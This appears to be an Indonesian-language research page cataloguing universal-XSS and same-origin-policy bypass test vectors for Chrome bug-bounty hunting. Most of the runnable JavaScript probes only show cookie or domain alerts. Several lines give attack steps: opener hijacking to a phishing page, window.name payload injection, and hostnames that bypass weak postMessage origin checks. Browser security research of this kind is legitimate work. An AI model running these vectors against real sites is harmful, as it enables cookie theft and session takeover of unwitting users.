UXSS Research Lab

Universal XSS = JavaScript execution in any origin's context. SOP bypass. Max Chrome VRP.

Apa itu UXSS? Berbeda dengan normal XSS (hanya di satu origin), UXSS memungkinkan attacker mengeksekusi JS di konteks origin LAIN — misalnya menjalankan alert(document.cookie) di google.com dari halaman attacker. Ini = Same-Origin Policy bypass = Chrome VRP Critical / $15k–$30k+

U1UXSS

javascript: URI dalam iframe src

Jika <iframe src="javascript:..."> dapat mengakses DOM parent, attacker dari evil.com bisa menulis JS yang runs di konteks parent origin. Chrome seharusnya memblokir ini — test untuk memastikan. 
// Test: apakah iframe javascript: inherit parent origin?
const f = document.createElement('iframe');
f.src = "javascript:document.write('<script>parent.document.title=\"UXSS\"</scr'+'ipt>')";
document.body.appendChild(f);

// Expected BLOCKED: iframe.contentDocument = null atau about:blank
// UXSS FOUND: parent.document dapat dimodifikasi dari dalam iframe
→ Run test.
U2UXSS

window.open("javascript:...")

window.open("javascript:alert(1)") membuka popup dengan origin mewarisi dari opener. Jika popup dapat mengakses opener.document, ini UXSS. Chrome membatasi ini — tapi kombinasi dengan navigasi kadang bisa bypass. 
// Variant A: langsung
const w = window.open("javascript:alert(document.domain)");

// Variant B: open blank dulu, lalu navigate
const w = window.open("about:blank");
w.location = "javascript:alert(opener.document.domain)";

// Variant C: setelah navigasi ke real page
const w = window.open("https://example.com");
setTimeout(() => { w.location = "javascript:alert(document.cookie)"; }, 1000);
→ Run test.
U3UXSS

location= "javascript:" setelah cross-origin navigasi

Setelah frame menavigasi ke cross-origin URL, set frame.location = "javascript:..." dari parent. Apakah JS berjalan di konteks origin baru (cross-origin) atau origin lama? Ini salah satu vector UXSS yang historically sering muncul di Chromium bugs. 
// Langkah:
// 1. Parent di evil.com membuka iframe ke victim.com
// 2. iframe.location = "https://victim.com"
// 3. Setelah load, parent set: iframe.location = "javascript:alert(document.cookie)"
// 4. Jika JS berjalan di victim.com context → UXSS

const f = document.querySelector('iframe');
f.src = "https://example.com";
f.onload = () => {
  f.contentWindow.location = "javascript:alert(document.domain)";
  // Harusnya: SecurityError (cross-origin write blocked)
  // UXSS: JS runs di example.com context
};
→ Run test.
U4UXSS

a[href="javascript:"] synthetic click

Inject <a href="javascript:..."> ke dalam cross-origin frame, lalu trigger .click() secara programmatic dari parent. Apakah browser mengizinkan? Tanpa user gesture, seharusnya diblokir di modern Chrome. 
// Inject link ke iframe cross-origin, trigger click
const f = document.querySelector('iframe');
const a = f.contentDocument.createElement('a');  // Ini sudah blocked oleh SOP
a.href = "javascript:alert(document.cookie)";
f.contentDocument.body.appendChild(a);
a.click();

// Test lain: target="_parent" untuk navigate parent
const a2 = document.createElement('a');
a2.href = "javascript:alert(parent.document.cookie)";
a2.target = "_parent";
a2.click();
→ Run test.
U5UXSS

about:blank Origin Inheritance

about:blank mewarisi origin dari halaman yang membukanya. Edge case: jika cross-origin page membuka about:blank dan bisa inject script, apakah script itu berjalan di context opener (parent) origin? 
// about:blank dibuka oleh attacker.com → inherit attacker.com (NORMAL)
const w = window.open("about:blank");
w.document.write("<script>alert(document.domain)</script>");
// → alert("file://") atau "localhost" (origin attacker)

// UXSS scenario: victim.com membuka about:blank
// attacker mendapat reference ke popup via target="_blank" + opener
// attacker menulis ke popup yang "owned" oleh victim.com

// Test: apakah about:blank window dari cross-origin frame accessible?
const f = document.createElement('iframe');
f.src = "https://example.com";
document.body.appendChild(f);
f.onload = () => {
  const sub = f.contentWindow.open("about:blank"); // cross-origin → exception
  // Jika tidak exception → sub.document adalah about:blank dengan origin example.com
};
→ Run test.
U6UXSS

blob: URL Cross-Origin Access

blob: URL dibuat oleh suatu origin hanya bisa dibaca oleh origin yang sama. Bug: jika attacker bisa trick cross-origin page untuk fetch blob URL attacker, atau jika blob URL origin tracking ada celah → UXSS / data exfil. 
// blob: URL mewarisi origin creator
const blob = new Blob(["<script>alert(document.domain)</script>"],
  {type:"text/html"});
const url = URL.createObjectURL(blob);
// url = "blob:https://attacker.com/uuid"
// → page di blob: berjalan di context "https://attacker.com"

// Bug scenario: cross-origin iframe src = blob URL dari parent
// Parent di A.com buat blob URL → set ke iframe
// iframe sekarang berjalan di konteks A.com, bisa akses parent DOM

const f = document.createElement('iframe');
f.src = url;  // blob:// dari A.com → iframe run di A.com context!
document.body.appendChild(f);
// f.contentDocument.body → accessible dari parent (same origin)
// UXSS jika f.contentDocument bisa exfil data dari parent
→ Run test.
U7UXSS

iframe[srcdoc] Parent DOM Access

iframe[srcdoc] membuat about:srcdoc document. Origin-nya adalah parent's origin — artinya srcdoc iframe BISA mengakses parent DOM secara legitimate. Bug: jika attacker bisa inject ke srcdoc dari cross-origin context. 
// srcdoc iframe berjalan di SAME origin sebagai parent
const f = document.createElement('iframe');
f.srcdoc = "<script>alert(parent.document.domain)</script>";
document.body.appendChild(f);
// → alert() menampilkan domain parent (EXPECTED)

// UXSS scenario:
// 1. Victim site menggunakan iframe[srcdoc] dengan konten user-controlled
// 2. Attacker inject JS ke srcdoc content
// 3. JS berjalan di origin victim.com → access victim's cookies

// Test: apakah srcdoc bisa akses parent dengan sandbox?
const f2 = document.createElement('iframe');
f2.setAttribute('sandbox', 'allow-scripts');
f2.srcdoc = "<script>try{parent.document.title='UXSS'}catch(e){document.write(e)}</script>";
document.body.appendChild(f2);
→ Run test.

window.opener Chain Exploitation

window.opener memberikan reference ke halaman yang membuka popup. Jika opener tidak di-nullified (rel="noopener"), popup bisa navigate opener ke URL lain — termasuk javascript: URL. 
// Victim.com membuka popup TANPA noopener:
// <a href="https://attacker.com" target="_blank">

// Di attacker.com (popup):
if (window.opener) {
  // opener adalah victim.com window
  window.opener.location = "javascript:alert(document.cookie)";
  // Jika berhasil → UXSS di victim.com context

  // Atau navigate ke phishing page:
  window.opener.location = "https://evil.com/phish";
}

// Test chains:
// opener.opener.location  (dua level)
// opener.frames[0].location (target nested frame)

U9MEDIUM

window.name Persistence Across Origins

window.name persists ketika frame navigasi ke URL lain — bahkan cross-origin! Ini bukan UXSS langsung, tapi bisa digunakan untuk data exfiltration atau sebagai channel untuk payload delivery ke cross-origin page yang membaca window.name. 
// Di attacker.com:
window.name = "<script>alert(1)</script>";  // payload
location = "https://victim.com/page-that-reads-window.name";

// Di victim.com (vulnerable code):
document.write(window.name);  // XSS via window.name

// Test: apakah window.name survive navigation?
window.name = "PAYLOAD_TEST_12345";
// Navigate ke halaman lain → kembali → cek window.name
→ Run test.
Hunting tip: Cari target apps yang melakukan document.write(window.name), innerHTML = window.name, atau eval(window.name). Banyak legacy apps masih melakukan ini untuk "messaging" antar halaman sebelum postMessage ada.
U10UXSS

History Navigation Race + javascript: URI

Race condition: navigate iframe ke URL A, kemudian trigger history.go(-1) sambil inject javascript: URL. Ada window di mana browser mungkin menjalankan JS di origin A padahal frame sudah/belum load. Ini classic UXSS pattern. 
// Classic pattern (James Lee / taviso style):
const f = document.createElement('iframe');
f.src = "https://example.com";
document.body.appendChild(f);

f.onload = function() {
  // Frame loaded example.com
  f.contentWindow.history.pushState({}, '', '/page2');
  // Race: navigate back + inject js:
  f.contentWindow.location = "javascript:void(0)";
  f.contentWindow.history.go(-1);
  // Di beberapa versi Chromium lama, JS runs di example.com context
};

// Variant: parent triggers history.back() pada frame
// sementara inject javascript: URI ke frame
→ Run test.

// → sub1.document dari sub2 → read cookies, DOM manipulation

Setting document.domain = "" (empty string) historically berperilaku berbeda di browser berbeda. Di beberapa versi, ini bisa membuat two pages dengan empty domain bisa saling akses — bahkan lintas origin. 
// Test: behavior of document.domain = ""
console.log("before:", document.domain);
try {
  document.domain = "";
  console.log("after:", document.domain);  // Apa hasilnya?
} catch(e) {
  console.log("error:", e.message);
}

// Di Chrome versi lama: document.domain = "" → domain = ""
// Dua halaman berbeda dengan domain = "" → bisa saling akses?

// Tambahan test: document.domain = location.hostname
// document.domain = document.domain (reset ke current)

U14MEDIUM

postMessage targetOrigin Bypass

Apps yang cek origin dengan startsWith, includes, atau regex yang lemah bisa dibypass. Contoh: cek e.origin.includes("trusted.com") → bypass dengan trusted.com.evil.com. 
// Bypasses untuk berbagai weak origin checks:

// 1. includes() check
// if (e.origin.includes("trusted.com"))  ← bypass: "trusted.com.evil.com"

// 2. startsWith() check
// if (e.origin.startsWith("https://trusted"))  ← bypass: "https://trustedX.evil.com"

// 3. endsWith() check
// if (e.origin.endsWith(".trusted.com"))  ← bypass: "evil.trusted.com" (jika attacker bisa subdomain)

// 4. Regex without anchors
// if (/trusted\.com/.test(e.origin))  ← bypass: "evil-trusted.com-evil.com"

// 5. Protocol confusion
// if (e.origin === "https://trusted.com")  ← null origin bypass via sandboxed iframe
// sandbox iframe → origin = "null" → cek null === "https://..." → false...
// tapi ada kasus where null origin accepted

U15UXSS

Service Worker Navigation Interception

Service Worker yang intercept navigation requests bisa serve response dengan content dari origin berbeda. Bug: jika SW bisa "spoof" origin di response headers, browser mungkin assign origin yang salah ke resulting document. 
// SW bug scenario:
// 1. Attacker register SW di attacker.com
// 2. SW intercepts fetch ke https://victim.com
// 3. SW serve response dengan body dari attacker + headers yang claim "victim.com"
// 4. Browser assign wrong origin?

// Di service-worker.js:
self.addEventListener('fetch', event => {
  if (event.request.url.includes('victim.com')) {
    event.respondWith(new Response(
      '<script>alert(document.domain)</script>',
      { headers: { 'Content-Type': 'text/html',
                   'Access-Control-Allow-Origin': '*' } }
    ));
  }
});

// Real SW UXSS bugs: CVE-2019-5858 (Safari), multiple Chrome bugs
// Key constraint: SW scope harus di bawah SW's own origin
→ Requires HTTPS or localhost.
